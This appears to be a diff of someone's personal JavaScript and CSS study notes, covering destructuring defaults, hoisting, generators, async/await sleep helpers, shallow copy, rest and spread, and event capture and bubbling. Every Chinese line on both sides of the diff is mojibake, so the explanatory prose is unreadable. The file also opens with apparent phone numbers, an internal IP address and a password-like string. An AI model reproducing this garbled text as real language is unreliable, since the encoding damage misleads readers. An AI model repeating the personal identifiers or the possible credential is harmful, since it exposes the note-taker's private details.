@@ -2,56 +2,56 @@
 image/vnd.dwg
 15207258212
 15071257752
-74729 ³ÂÐñ 25607
+74729 é™ˆæ—­ 25607
 
 2908006163
 73620
 258Wlwx77524
 
-jay(00),·¶ÌØÎ÷(01),°Ë¶È¿Õ¼ä(02),Ò¶»ÝÃÀ(03),ÆßÀïÏã(04),Ê®Ò»ÔÂµÄÐ¤°î(05),ÒÀÈ»·¶ÌØÎ÷(06),ÎÒºÜÃ¦(07),Ä¦ôÉ×ù(08),¿çÊ±´ú(10),¾ªÌ¾ºÅ(11),Ê®¶þÐÇ×ù(12),°¥Ó´²»´íÅ¶(14),´²±ß¹ÊÊÂ(16)!
+jay(00),èŒƒç‰¹è¥¿(01),å…«åº¦ç©ºé—´(02),å¶æƒ ç¾Ž(03),ä¸ƒé‡Œé¦™(04),åä¸€æœˆçš„è‚–é‚¦(05),ä¾ç„¶èŒƒç‰¹è¥¿(06),æˆ‘å¾ˆå¿™(07),æ‘©ç¾¯åº§(08),è·¨æ—¶ä»£(10),æƒŠå¹å·(11),åäºŒæ˜Ÿåº§(12),å“Žå“Ÿä¸é”™å“¦(14),åºŠè¾¹æ•…äº‹(16)!
 10.130.133.27 17
 
 
-³£¼ûµÄÐÐÄÚ¿éÔªËØ img input ¿ÉÒÔÉèÖÃ¿í¸ß  ÐÐÄÚºÍÐÐÄÚ¿éÔªËØÖ®¼ä»áÓÐ¼ä¸ô!½â¾ö·½·¨ÈçÏÂ!
-1.½«ËùÓÐµÄÐÐÄÚ¿éÔªËØÖ±½ÓÉèÖÃ¸¡¶¯£¬¸öÈËÈÏÎª×îÖ±½ÓµÄ·½·¨£¬µ±È»ÊÇÔÚÊÊµ±µÄ³¡¾°ÖÐ£¬ÒòÎª¹ý¶ÈµÄ¸¡¶¯»á²úÉúÐèÒªÇå³ý¸¡¶¯µÄ±ØÒª£¨×Ô¼ºÒ²×Ü½á³£ÓÃµÄÇå³ý¸¡¶¯µÄ·½·¨£¬ÓÐÐËÈ¤¿ÉÒÔß÷ß÷¿´¿´£¬´óÉñÔ½¹ý£©¡£
-2.ÔÚ²úÉú±ß¾àµÄÐÐÄÚ¿éµÄ¸¸ÔªËØÉèÖÃÊôÐÔ£ºfont-size£º0px;
-3.ÔÚ¸¸ÔªËØÉÏÉèÖÃ£¬word-spacing(´Ê±ß¾à)µÄÖµÉèÎªºÏÊÊµÄ¸ºÖµ¼´¿É
-4.ÔÚhtmlÖÐ½«ÐÐÄÚ¿éÔªËØÔÚÍ¬Ò»ÐÐÏÔÊ¾£¬²»Òª½øÐÐÃÀ¹ÛËõ½ø»òÕß»»ÐÐ
+å¸¸è§çš„è¡Œå†…å—å…ƒç´  img input å¯ä»¥è®¾ç½®å®½é«˜  è¡Œå†…å’Œè¡Œå†…å—å…ƒç´ ä¹‹é—´ä¼šæœ‰é—´éš”!è§£å†³æ–¹æ³•å¦‚ä¸‹!
+1.å°†æ‰€æœ‰çš„è¡Œå†…å—å…ƒç´ ç›´æŽ¥è®¾ç½®æµ®åŠ¨ï¼Œä¸ªäººè®¤ä¸ºæœ€ç›´æŽ¥çš„æ–¹æ³•ï¼Œå½“ç„¶æ˜¯åœ¨é€‚å½“çš„åœºæ™¯ä¸­ï¼Œå› ä¸ºè¿‡åº¦çš„æµ®åŠ¨ä¼šäº§ç”Ÿéœ€è¦æ¸…é™¤æµ®åŠ¨çš„å¿…è¦ï¼ˆè‡ªå·±ä¹Ÿæ€»ç»“å¸¸ç”¨çš„æ¸…é™¤æµ®åŠ¨çš„æ–¹æ³•ï¼Œæœ‰å…´è¶£å¯ä»¥å–µå–µçœ‹çœ‹ï¼Œå¤§ç¥žè¶Šè¿‡ï¼‰ã€‚
+2.åœ¨äº§ç”Ÿè¾¹è·çš„è¡Œå†…å—çš„çˆ¶å…ƒç´ è®¾ç½®å±žæ€§ï¼šfont-sizeï¼š0px;
+3.åœ¨çˆ¶å…ƒç´ ä¸Šè®¾ç½®ï¼Œword-spacing(è¯è¾¹è·)çš„å€¼è®¾ä¸ºåˆé€‚çš„è´Ÿå€¼å³å¯
+4.åœ¨htmlä¸­å°†è¡Œå†…å—å…ƒç´ åœ¨åŒä¸€è¡Œæ˜¾ç¤ºï¼Œä¸è¦è¿›è¡Œç¾Žè§‚ç¼©è¿›æˆ–è€…æ¢è¡Œ
 
-a±êÇ©Î±Àà¼Ç×¡love hateÔ­ÔòË³Ðò¼´Îªlink visited hover active
+aæ ‡ç­¾ä¼ªç±»è®°ä½love hateåŽŸåˆ™é¡ºåºå³ä¸ºlink visited hover active
 
-ÓÉÓÚmouseenter²»Ö§³ÖÊÂ¼þÃ°ÅÝ£¬µ¼ÖÂÔÚÒ»¸öÔªËØµÄ×ÓÔªËØÉÏ½øÈë»òÀë¿ªµÄÊ±ºò»á´¥·¢ÆämouseoverºÍmouseoutÊÂ¼þ£¬µ«ÊÇÈ´²»»á´¥·¢mouseenterºÍmouseleaveÊÂ¼þ
+ç”±äºŽmouseenterä¸æ”¯æŒäº‹ä»¶å†’æ³¡ï¼Œå¯¼è‡´åœ¨ä¸€ä¸ªå…ƒç´ çš„å­å…ƒç´ ä¸Šè¿›å…¥æˆ–ç¦»å¼€çš„æ—¶å€™ä¼šè§¦å‘å…¶mouseoverå’Œmouseoutäº‹ä»¶ï¼Œä½†æ˜¯å´ä¸ä¼šè§¦å‘mouseenterå’Œmouseleaveäº‹ä»¶
 
 
 function move({x = 0, y = 0} = {}) {
   return [x, y];
 }
-Ïàµ±ÓÚ{x=0,y=0} = Äã´«½øÀ´µÄ¶ÔÏó
+ç›¸å½“äºŽ{x=0,y=0} = ä½ ä¼ è¿›æ¥çš„å¯¹è±¡
 move({x: 3, y: 8}); // [3, 8]
 move({x: 3}); // [3, 0]
 move({}); // [0, 0]
 move(); // [0, 0]
-ÉÏÃæ´úÂëÖÐ£¬º¯ÊýmoveµÄ²ÎÊýÊÇÒ»¸ö¶ÔÏó£¬Í¨¹ý¶ÔÕâ¸ö¶ÔÏó½øÐÐ½â¹¹£¬µÃµ½±äÁ¿xºÍyµÄÖµ¡£Èç¹û½â¹¹Ê§°Ü£¬xºÍyµÈÓÚÄ¬ÈÏÖµ¡£
+ä¸Šé¢ä»£ç ä¸­ï¼Œå‡½æ•°moveçš„å‚æ•°æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œé€šè¿‡å¯¹è¿™ä¸ªå¯¹è±¡è¿›è¡Œè§£æž„ï¼Œå¾—åˆ°å˜é‡xå’Œyçš„å€¼ã€‚å¦‚æžœè§£æž„å¤±è´¥ï¼Œxå’Œyç­‰äºŽé»˜è®¤å€¼ã€‚
 
-×¢Òâ£¬ÏÂÃæµÄÐ´·¨»áµÃµ½²»Ò»ÑùµÄ½á¹û¡£
+æ³¨æ„ï¼Œä¸‹é¢çš„å†™æ³•ä¼šå¾—åˆ°ä¸ä¸€æ ·çš„ç»“æžœã€‚
 
 function move({x, y} = { x: 0, y: 0 }) {
   return [x, y];
 }
-Ïàµ±ÓÚ{x,y} = Äã´«½øÀ´µÄ¶ÔÏó
+ç›¸å½“äºŽ{x,y} = ä½ ä¼ è¿›æ¥çš„å¯¹è±¡
 
 move({x: 3, y: 8}); // [3, 8]
 move({x: 3}); // [3, undefined]
 move({}); // [undefined, undefined]
 move(); // [0, 0]
 
-µÚÒ»ÖÖÏàµ±ÓÚ{x = 0, y = 0}={x: 3, y: 8},Èç¹ûÊ²Ã´¶¼Ã»ÓÐ´«ÔòÏàµ±ÓÚ{x = 0, y = 0} = {}
+ç¬¬ä¸€ç§ç›¸å½“äºŽ{x = 0, y = 0}={x: 3, y: 8},å¦‚æžœä»€ä¹ˆéƒ½æ²¡æœ‰ä¼ åˆ™ç›¸å½“äºŽ{x = 0, y = 0} = {}
 
-µÚ¶þÖÖÏàµ±ÓÚ{x, y} = {x: 3, y: 8},Èç¹ûÊ²Ã´¶¼Ã»ÓÐ´«ÔòÊÇÎª{ x: 0, y: 0 }
+ç¬¬äºŒç§ç›¸å½“äºŽ{x, y} = {x: 3, y: 8},å¦‚æžœä»€ä¹ˆéƒ½æ²¡æœ‰ä¼ åˆ™æ˜¯ä¸º{ x: 0, y: 0 }
 {x, y} = { x: 0, y: 0 }
 
 
-¶ÔÏóÀïÃæµÄÊôÐÔ²»¹ÜÄãÊÇ·ñ¼ÓÒýºÅ,ËûµÄÖµ¶¼ÊÇ×Ö·û´®ÀàÐÍ,¼´Ê¹ÊÇÊý×ÖÒ²»á×ª³É×Ö·û´®ÀàÐÍ,¶ÔÓÚÍ¨¹ý[]·½·¨À´»ñµÃÊôÐÔÖµ,[]ÀïÃæµÄÖµ±ØÐëÊÇ×Ö·û´®ÀàÐÍ,´«ÈëÊý×Ö»á×Ô¶¯×ªÎª×Ö·û´®ÀàÐÍ.¶øÍ¨¹ý.ÊôÐÔ»ñµÃÊôÐÔµÄÖµ,.ºóÃæ¸úµÄ±ØÐëÊÇ¸´ºÏ±äÁ¿ÃüÃû·¨ÔòµÄÖµ,ÏñÊý×Ö¿ªÍ·µÄÖµ¾Í²»ÄÜ·ÃÎÊ,²¢ÇÒºóÃæ¸úµÄÖµÊÇ²»ÐèÒª¼ÓÒýºÅµÄ!!!!
+å¯¹è±¡é‡Œé¢çš„å±žæ€§ä¸ç®¡ä½ æ˜¯å¦åŠ å¼•å·,ä»–çš„å€¼éƒ½æ˜¯å­—ç¬¦ä¸²ç±»åž‹,å³ä½¿æ˜¯æ•°å­—ä¹Ÿä¼šè½¬æˆå­—ç¬¦ä¸²ç±»åž‹,å¯¹äºŽé€šè¿‡[]æ–¹æ³•æ¥èŽ·å¾—å±žæ€§å€¼,[]é‡Œé¢çš„å€¼å¿…é¡»æ˜¯å­—ç¬¦ä¸²ç±»åž‹,ä¼ å…¥æ•°å­—ä¼šè‡ªåŠ¨è½¬ä¸ºå­—ç¬¦ä¸²ç±»åž‹.è€Œé€šè¿‡.å±žæ€§èŽ·å¾—å±žæ€§çš„å€¼,.åŽé¢è·Ÿçš„å¿…é¡»æ˜¯å¤åˆå˜é‡å‘½åæ³•åˆ™çš„å€¼,åƒæ•°å­—å¼€å¤´çš„å€¼å°±ä¸èƒ½è®¿é—®,å¹¶ä¸”åŽé¢è·Ÿçš„å€¼æ˜¯ä¸éœ€è¦åŠ å¼•å·çš„!!!!
 
 
 var tmp = new Date();
@@ -65,7 +65,7 @@ function f() {
 
 f(); // undefined
 
-Ïàµ±ÓÚ :
+ç›¸å½“äºŽ :
 var tmp = new Date();
 
 function f() {
@@ -76,10 +76,10 @@ function f() {
   }
 }
 
-f(); ËùÒÔ¿Ï¶¨Êä³öundefined°¡!
+f(); æ‰€ä»¥è‚¯å®šè¾“å‡ºundefinedå•Š!
 
 
-Ç³¿½±´ÊÇÖ¸Ö»¸´ÖÆÒ»²ã¶ÔÏó£¬µ±¶ÔÏóµÄÊôÐÔÊÇÒýÓÃÀàÐÍÊ±£¬ÊµÖÊ¸´ÖÆµÄÊÇÆäÒýÓÃ£¬µ±ÒýÓÃÖ¸ÏòµÄÖµ¸Ä±äÊ±Ò²»á¸ú×Å±ä»¯,µ±¶ÔÏóÊÇÖµÀàÐÍµÄÊ±ºò¾ÍÖ±½Ó¸´ÖÆÖµÁË
+æµ…æ‹·è´æ˜¯æŒ‡åªå¤åˆ¶ä¸€å±‚å¯¹è±¡ï¼Œå½“å¯¹è±¡çš„å±žæ€§æ˜¯å¼•ç”¨ç±»åž‹æ—¶ï¼Œå®žè´¨å¤åˆ¶çš„æ˜¯å…¶å¼•ç”¨ï¼Œå½“å¼•ç”¨æŒ‡å‘çš„å€¼æ”¹å˜æ—¶ä¹Ÿä¼šè·Ÿç€å˜åŒ–,å½“å¯¹è±¡æ˜¯å€¼ç±»åž‹çš„æ—¶å€™å°±ç›´æŽ¥å¤åˆ¶å€¼äº†
 var obj = { a:1, arr: [2,3] };
 var shallowObj = shallowCopy(obj);
 
@@ -93,7 +93,7 @@ function shallowCopy(src) {
   return dst;
 }
 
-//µ±Ò»¸ö¶ÔÏóÊôÐÔµÄÒýÓÃÖµ¸Ä±äÊ±½«µ¼ÖÂÁíÒ»¸öÒ²¸Ä±ä
+//å½“ä¸€ä¸ªå¯¹è±¡å±žæ€§çš„å¼•ç”¨å€¼æ”¹å˜æ—¶å°†å¯¼è‡´å¦ä¸€ä¸ªä¹Ÿæ”¹å˜
 shallowObj.arr[1] = 5;
 obj.arr[1]   // = 5
 
@@ -102,7 +102,7 @@ function* gen(x){
   return y;
 }
 
-yield x+2 Ö´ÐÐÖ®ºóµÄ²¢Ã»ÓÐ·µ»Ø½á¹û ¶øy½ÓÊÕµÄÊÇ·µ»Ø½á¹ûËùÒÔÊÇundefined,µ«ÊÇÈç¹ûg.next()ÔÙg.next(2)¾ÍÈÃÉÏÒ»²½µÄ·µ»Ø½á¹û±äÎª2,ËùÒÔvar y = 2;È»ºóreturn y ¾ÍÊÇ{value:2,done:true};
+yield x+2 æ‰§è¡Œä¹‹åŽçš„å¹¶æ²¡æœ‰è¿”å›žç»“æžœ è€ŒyæŽ¥æ”¶çš„æ˜¯è¿”å›žç»“æžœæ‰€ä»¥æ˜¯undefined,ä½†æ˜¯å¦‚æžœg.next()å†g.next(2)å°±è®©ä¸Šä¸€æ­¥çš„è¿”å›žç»“æžœå˜ä¸º2,æ‰€ä»¥var y = 2;ç„¶åŽreturn y å°±æ˜¯{value:2,done:true};
 
 function* gen(x){
   
@@ -113,7 +113,7 @@ function* gen(x){
 var test = gen(2);
 
 
-Ã¿´Îµ÷ÓÃnext·½·¨£¬ÄÚ²¿Ö¸Õë¾Í´Óº¯ÊýÍ·²¿»òÉÏÒ»´ÎÍ£ÏÂÀ´µÄµØ·½¿ªÊ¼Ö´ÐÐ£¬Ö±µ½Óöµ½ÏÂÒ»¸öyield±í´ïÊ½£¨»òreturnÓï¾ä£©ÎªÖ¹¡£ÉÏÃæÕâ¸öÀý×ÓµÚÒ»´ÎÖ´ÐÐ yield x+2;Ö´ÐÐÍê½áÊøµÈ´ýµÚ¶þ´ÎnextÒÆ¶¯,µÚ¶þ´ÎÖ´ÐÐÃ»ÓÐÕÒµ½yield Ò²Ã»ÓÐÕÒµ½return ËùÒÔÖ±½Ó½áÊø(ÕâÀïÈç¹ûÓÐreturn doneµÄÖµÒ²ÊÇÎªtrue)
+æ¯æ¬¡è°ƒç”¨nextæ–¹æ³•ï¼Œå†…éƒ¨æŒ‡é’ˆå°±ä»Žå‡½æ•°å¤´éƒ¨æˆ–ä¸Šä¸€æ¬¡åœä¸‹æ¥çš„åœ°æ–¹å¼€å§‹æ‰§è¡Œï¼Œç›´åˆ°é‡åˆ°ä¸‹ä¸€ä¸ªyieldè¡¨è¾¾å¼ï¼ˆæˆ–returnè¯­å¥ï¼‰ä¸ºæ­¢ã€‚ä¸Šé¢è¿™ä¸ªä¾‹å­ç¬¬ä¸€æ¬¡æ‰§è¡Œ yield x+2;æ‰§è¡Œå®Œç»“æŸç­‰å¾…ç¬¬äºŒæ¬¡nextç§»åŠ¨,ç¬¬äºŒæ¬¡æ‰§è¡Œæ²¡æœ‰æ‰¾åˆ°yield ä¹Ÿæ²¡æœ‰æ‰¾åˆ°return æ‰€ä»¥ç›´æŽ¥ç»“æŸ(è¿™é‡Œå¦‚æžœæœ‰return doneçš„å€¼ä¹Ÿæ˜¯ä¸ºtrue)
 
 class Sleep {
   constructor(timeout) {
@@ -133,7 +133,7 @@ class Sleep {
   console.log(sleepTime);
 })();
 
-await ºóÃæÈç¹ûÊÇpromise¶ÔÏó¾Í·µ»Øpromise¶ÔÏóµÄ½á¹û,Èç¹û²»ÊÇ¾Í·µ»Ø¶ÔÓ¦µÄÖµ,ÉÏÃæÀý×ÓÖÐ,ËäÈ»new Sleep()·µ»ØµÄÊÇÒ»¸öSleepÊµÀý¶ÔÏóµ«ÊÇSleepÀïÃæ¶¨ÒåÁËthen·½·¨,ËùÒÔ»á°ÑÆäµ±³ÉPromise¶ÔÏóÀ´´¦Àí,ËùÒÔsleeptime»á·µ»Ø¶ÔÏóµÄ½á¹û,¶ø¸Ã¶ÔÏóµÄ½á¹û¾ÍÊÇresolveº¯ÊýÖ®ÐÐÖ®ºóµÄ·µ»ØÖµ,¶øresolveÔÚsetTimeoutÀïÃæ²Å»áÖ´ÐÐ,¹Ê»áµÈ´ý1000ms,Ö´ÐÐresolveº¯Êý,²¢½«Date.now()-startTimeµÄÖµ·µ»Ø³öÈ¥!¾Í±»sleepTime½ÓÊÕµ½!
+await åŽé¢å¦‚æžœæ˜¯promiseå¯¹è±¡å°±è¿”å›žpromiseå¯¹è±¡çš„ç»“æžœ,å¦‚æžœä¸æ˜¯å°±è¿”å›žå¯¹åº”çš„å€¼,ä¸Šé¢ä¾‹å­ä¸­,è™½ç„¶new Sleep()è¿”å›žçš„æ˜¯ä¸€ä¸ªSleepå®žä¾‹å¯¹è±¡ä½†æ˜¯Sleepé‡Œé¢å®šä¹‰äº†thenæ–¹æ³•,æ‰€ä»¥ä¼šæŠŠå…¶å½“æˆPromiseå¯¹è±¡æ¥å¤„ç†,æ‰€ä»¥sleeptimeä¼šè¿”å›žå¯¹è±¡çš„ç»“æžœ,è€Œè¯¥å¯¹è±¡çš„ç»“æžœå°±æ˜¯resolveå‡½æ•°ä¹‹è¡Œä¹‹åŽçš„è¿”å›žå€¼,è€Œresolveåœ¨setTimeouté‡Œé¢æ‰ä¼šæ‰§è¡Œ,æ•…ä¼šç­‰å¾…1000ms,æ‰§è¡Œresolveå‡½æ•°,å¹¶å°†Date.now()-startTimeçš„å€¼è¿”å›žå‡ºåŽ»!å°±è¢«sleepTimeæŽ¥æ”¶åˆ°!
 
 function sleep(interval) {
   return new Promise(resolve => {
@@ -141,7 +141,7 @@ function sleep(interval) {
   })
 }
 
-// ÓÃ·¨
+// ç”¨æ³•
 async function one2FiveInAsync() {
   for(let i = 1; i <= 5; i++) {
     console.log(i);
@@ -151,25 +151,25 @@ async function one2FiveInAsync() {
 
 one2FiveInAsync();
 
-ÎªÊ²Ã´²»ÄÜÔÚawaitºóÃæÖ±½ÓÐ´setTimeoutÀ´ÊµÏÖË¯Ãß?
-´ð:awaitºóÃæÖ»ÓÐÊÇÒ»¸öpromise¶ÔÏó²Å»áµÃµ½¶ÔÏóµÄ½á¹û,Ð´setTimeout()²»ÊÇpromise¶ÔÏóËùÒÔÖ±½Ó¾Í·µ»ØÁËÕâ¸öº¯ÊýµÄÖµÒ²¾ÍÊÇÏàµ±ÓÚvar x = setTimeout(...);xµÃµ½µÄÊÇÒ»¸öÕýÕûÊýÖµ,¶øÍ¨¹ýÉÏÃæÀý×ÓÄÇÖÖÐ´·¨,Í¨¹ýÒ»¸öº¯ÊýÀ´·µ»ØÒ»¸öpromise¶ÔÏó,ÔÙÔÚ¶ÔÏóÀïÃæÖ´ÐÐsetTimeoutº¯Êý,È»ºósetTimeoutº¯ÊýÀïÃæÍ¨¹ýÖ´ÐÐresolveº¯ÊýÀ´½«Æä±äÎªresolved×´Ì¬µÃµ½½á¹û(promise¹¹Ôìº¯Êý½ÓÊÕÒ»¸ö²ÎÊýÎªº¯Êý,Õâ¸öº¯ÊýÀïÃæÓÐÁ½¸ö²ÎÊý,ÕâÁ½¸ö²ÎÊý¶¼ÊÇº¯Êý,Ò»¸öÊÇresolve,Ò»¸öÊÇreject)¼´new Promise(function(resolve,reject){})
+ä¸ºä»€ä¹ˆä¸èƒ½åœ¨awaitåŽé¢ç›´æŽ¥å†™setTimeoutæ¥å®žçŽ°ç¡çœ ?
+ç­”:awaitåŽé¢åªæœ‰æ˜¯ä¸€ä¸ªpromiseå¯¹è±¡æ‰ä¼šå¾—åˆ°å¯¹è±¡çš„ç»“æžœ,å†™setTimeout()ä¸æ˜¯promiseå¯¹è±¡æ‰€ä»¥ç›´æŽ¥å°±è¿”å›žäº†è¿™ä¸ªå‡½æ•°çš„å€¼ä¹Ÿå°±æ˜¯ç›¸å½“äºŽvar x = setTimeout(...);xå¾—åˆ°çš„æ˜¯ä¸€ä¸ªæ­£æ•´æ•°å€¼,è€Œé€šè¿‡ä¸Šé¢ä¾‹å­é‚£ç§å†™æ³•,é€šè¿‡ä¸€ä¸ªå‡½æ•°æ¥è¿”å›žä¸€ä¸ªpromiseå¯¹è±¡,å†åœ¨å¯¹è±¡é‡Œé¢æ‰§è¡ŒsetTimeoutå‡½æ•°,ç„¶åŽsetTimeoutå‡½æ•°é‡Œé¢é€šè¿‡æ‰§è¡Œresolveå‡½æ•°æ¥å°†å…¶å˜ä¸ºresolvedçŠ¶æ€å¾—åˆ°ç»“æžœ(promiseæž„é€ å‡½æ•°æŽ¥æ”¶ä¸€ä¸ªå‚æ•°ä¸ºå‡½æ•°,è¿™ä¸ªå‡½æ•°é‡Œé¢æœ‰ä¸¤ä¸ªå‚æ•°,è¿™ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯å‡½æ•°,ä¸€ä¸ªæ˜¯resolve,ä¸€ä¸ªæ˜¯reject)å³new Promise(function(resolve,reject){})
 
 var foo = 1;
 console.log(foo);
 function foo(){
   console.log("foo");
 };
-Õâ´Î´òÓ¡½á¹û¾ÍÊÇ¡°1¡±£»
+è¿™æ¬¡æ‰“å°ç»“æžœå°±æ˜¯â€œ1â€ï¼›
 
-·Ö½â
-var foo; // Èç¹ûÈç¹û±äÁ¿Ãû³Æ¸úÒÑ¾­ÉùÃ÷µÄÐÎÊ½²ÎÊý»òº¯ÊýÏàÍ¬£¬Ôò±äÁ¿ÉùÃ÷²»»á¸ÉÈÅÒÑ¾­´æÔÚµÄÕâÀàÊôÐÔ
-foo = 1;// ´úÂëÖ´ÐÐ¡£PS: Èç¹ûÃ»ÓÐÕâÐÐ£¬´òÓ¡½á¹ûÊÇ function foo(){console.log('foo')};
+åˆ†è§£
+var foo; // å¦‚æžœå¦‚æžœå˜é‡åç§°è·Ÿå·²ç»å£°æ˜Žçš„å½¢å¼å‚æ•°æˆ–å‡½æ•°ç›¸åŒï¼Œåˆ™å˜é‡å£°æ˜Žä¸ä¼šå¹²æ‰°å·²ç»å­˜åœ¨çš„è¿™ç±»å±žæ€§
+foo = 1;// ä»£ç æ‰§è¡Œã€‚PS: å¦‚æžœæ²¡æœ‰è¿™è¡Œï¼Œæ‰“å°ç»“æžœæ˜¯ function foo(){console.log('foo')};
 console.log(foo); // 1
 function foo(){
   console.log("foo");
 };
 
-º¯ÊýÉùÃ÷ÓÅÏÈ¼¶±È±äÁ¿ÉùÃ÷¸ß!
+å‡½æ•°å£°æ˜Žä¼˜å…ˆçº§æ¯”å˜é‡å£°æ˜Žé«˜!
 
 function f(...test){
          let sum = 0;
@@ -178,31 +178,31 @@ function f(...test){
          }
          return sum;
 }
-f(1,2,3,4,5,6)  rest ²ÎÊý¾ÍÊÇ½«´«ÈëµÄ²ÎÊý±äÎªÊý×é,testÖ±½Ó¾ÍÊÇÒ»¸öÊý×éÁË
+f(1,2,3,4,5,6)  rest å‚æ•°å°±æ˜¯å°†ä¼ å…¥çš„å‚æ•°å˜ä¸ºæ•°ç»„,testç›´æŽ¥å°±æ˜¯ä¸€ä¸ªæ•°ç»„äº†
 
-¶øÍØÕ¹ÔËËã·û¿ÉÒÔÀí½âÎª½«´«ÈëµÄÊý×é±äÎª²ÎÊýÀýÈç¿ÉÒÔÕâÑù
+è€Œæ‹“å±•è¿ç®—ç¬¦å¯ä»¥ç†è§£ä¸ºå°†ä¼ å…¥çš„æ•°ç»„å˜ä¸ºå‚æ•°ä¾‹å¦‚å¯ä»¥è¿™æ ·
  var arr = [1,2,3,4,5,6]
- f(...arr);Õâ¸öµÈÓÚÉÏÃæµÄf(1,2,3,4,5,6)È»ºórestÔËËã·ûÓÖ½«´«ÈëµÄ²ÎÊý±ä³ÉÁËÒ»¸öÊý×é,ËùÒÔËµÍØÕ¹ÔËËã·ûÏàµ±ÓÚ restµÄÄæÔËËã!
+ f(...arr);è¿™ä¸ªç­‰äºŽä¸Šé¢çš„f(1,2,3,4,5,6)ç„¶åŽrestè¿ç®—ç¬¦åˆå°†ä¼ å…¥çš„å‚æ•°å˜æˆäº†ä¸€ä¸ªæ•°ç»„,æ‰€ä»¥è¯´æ‹“å±•è¿ç®—ç¬¦ç›¸å½“äºŽ restçš„é€†è¿ç®—!
 
-ÊÂ¼þ¾­¹ý:
+äº‹ä»¶ç»è¿‡:
 
-window ÍùÊÂ¼þ´¥·¢´¦´«²¥£¬Óöµ½×¢²áµÄ²¶»ñÊÂ¼þ»á´¥·¢
-´«²¥µ½ÊÂ¼þ´¥·¢´¦Ê±´¥·¢×¢²áµÄÊÂ¼þ
-´ÓÊÂ¼þ´¥·¢´¦Íù window ´«²¥£¬Óöµ½×¢²áµÄÃ°ÅÝÊÂ¼þ»á´¥·¢
+window å¾€äº‹ä»¶è§¦å‘å¤„ä¼ æ’­ï¼Œé‡åˆ°æ³¨å†Œçš„æ•èŽ·äº‹ä»¶ä¼šè§¦å‘
+ä¼ æ’­åˆ°äº‹ä»¶è§¦å‘å¤„æ—¶è§¦å‘æ³¨å†Œçš„äº‹ä»¶
+ä»Žäº‹ä»¶è§¦å‘å¤„å¾€ window ä¼ æ’­ï¼Œé‡åˆ°æ³¨å†Œçš„å†’æ³¡äº‹ä»¶ä¼šè§¦å‘
 
-µ«ÊÇÐèÒª×¢ÒâµÄÊÇÈç¹ûbodyÀïÃæµÄÖ±½Ó×Ó½ÚµãÍ¬Ê±×¢²áÃ°ÅÝºÍ²¶»ñ,È»ºóµã»÷¸Ã½ÚµãÄÇÃ´ÊÂ¼þ´¥·¢°´×¢²áË³ÐòÖ´ÐÐ
+ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯å¦‚æžœbodyé‡Œé¢çš„ç›´æŽ¥å­èŠ‚ç‚¹åŒæ—¶æ³¨å†Œå†’æ³¡å’Œæ•èŽ·,ç„¶åŽç‚¹å‡»è¯¥èŠ‚ç‚¹é‚£ä¹ˆäº‹ä»¶è§¦å‘æŒ‰æ³¨å†Œé¡ºåºæ‰§è¡Œ
 
-e.stopPropagation()×èÖ¹ÏòÉÏÃ°ÅÝ
-e.stopImmediatePropagation()ºóÃæÊÂ¼þ¶¼²»ÔÙ´¥·¢
+e.stopPropagation()é˜»æ­¢å‘ä¸Šå†’æ³¡
+e.stopImmediatePropagation()åŽé¢äº‹ä»¶éƒ½ä¸å†è§¦å‘
 
-ÊÂ¼þÓÐÈý¸ö½×¶Î,addEventListenerµÚÈý¸ö²ÎÊý¿ÉÒÔ¾ö¶¨ÏëÒªÔÚÄÇ¸öÊÂ¼þ½×¶Î´¥·¢ÊÂ¼þ,µÚÒ»½×¶ÎÊÇ²¶»ñÈ»ºóÄ¿±êÔÙÈ»ºóÊÇÃ°ÅÝ,Ä¬ÈÏÎªfalseÒ²¾ÍÊÇÔÚÃ°ÅÝ½×¶Î´¥·¢ÊÂ¼þ
-ÊÂ¼þ²¶»ñÓÉÍâÏòÀï,ÊÂ¼þÃ°ÅÝÓÉÀïÏòÍâ,Èç¹ûÍ¬Ò»¸öÄ¿±êÍ¬Ê±×¢²áÃ°ÅÝºÍ²¶»ñ,ÄÇÃ´ÊÂ¼þ´¥·¢µÄË³Ðò°´ÕÕ×¢²áË³ÐòÀ´½øÐÐ,ÊÂ¼þ²¶»ñÓÅÏÈÓÚÊÂ¼þÃ°ÅÝÒ²¾ÍÊÇÏÈ²¶»ñÔÙÃ°ÅÝ ¼ÙÉèÈý¸ödomÔªËØchild parent body
-¼ÙÉèÈý¸ö¶¼×¢²áÁËÃ°ÅÝµ«ÊÇparent»¹×¢²áÁË²¶»ñ½×¶ÎµÄÊÂ¼þ,ÄÇÃ´ÔÚÄãµãchildµÄÊ±ºòparent¾Í²¶»ñµ½ÁË,Èç¹ûbodyÒ²ÓÐ²¶»ñÄÇÃ´×î¿ªÊ¼¾ÍÊÇparent²¶»ñ,È»ºó°´Ã°ÅÝÀ´,child->parent->body
+äº‹ä»¶æœ‰ä¸‰ä¸ªé˜¶æ®µ,addEventListenerç¬¬ä¸‰ä¸ªå‚æ•°å¯ä»¥å†³å®šæƒ³è¦åœ¨é‚£ä¸ªäº‹ä»¶é˜¶æ®µè§¦å‘äº‹ä»¶,ç¬¬ä¸€é˜¶æ®µæ˜¯æ•èŽ·ç„¶åŽç›®æ ‡å†ç„¶åŽæ˜¯å†’æ³¡,é»˜è®¤ä¸ºfalseä¹Ÿå°±æ˜¯åœ¨å†’æ³¡é˜¶æ®µè§¦å‘äº‹ä»¶
+äº‹ä»¶æ•èŽ·ç”±å¤–å‘é‡Œ,äº‹ä»¶å†’æ³¡ç”±é‡Œå‘å¤–,å¦‚æžœåŒä¸€ä¸ªç›®æ ‡åŒæ—¶æ³¨å†Œå†’æ³¡å’Œæ•èŽ·,é‚£ä¹ˆäº‹ä»¶è§¦å‘çš„é¡ºåºæŒ‰ç…§æ³¨å†Œé¡ºåºæ¥è¿›è¡Œ,äº‹ä»¶æ•èŽ·ä¼˜å…ˆäºŽäº‹ä»¶å†’æ³¡ä¹Ÿå°±æ˜¯å…ˆæ•èŽ·å†å†’æ³¡ å‡è®¾ä¸‰ä¸ªdomå…ƒç´ child parent body
+å‡è®¾ä¸‰ä¸ªéƒ½æ³¨å†Œäº†å†’æ³¡ä½†æ˜¯parentè¿˜æ³¨å†Œäº†æ•èŽ·é˜¶æ®µçš„äº‹ä»¶,é‚£ä¹ˆåœ¨ä½ ç‚¹childçš„æ—¶å€™parentå°±æ•èŽ·åˆ°äº†,å¦‚æžœbodyä¹Ÿæœ‰æ•èŽ·é‚£ä¹ˆæœ€å¼€å§‹å°±æ˜¯parentæ•èŽ·,ç„¶åŽæŒ‰å†’æ³¡æ¥,child->parent->body
 
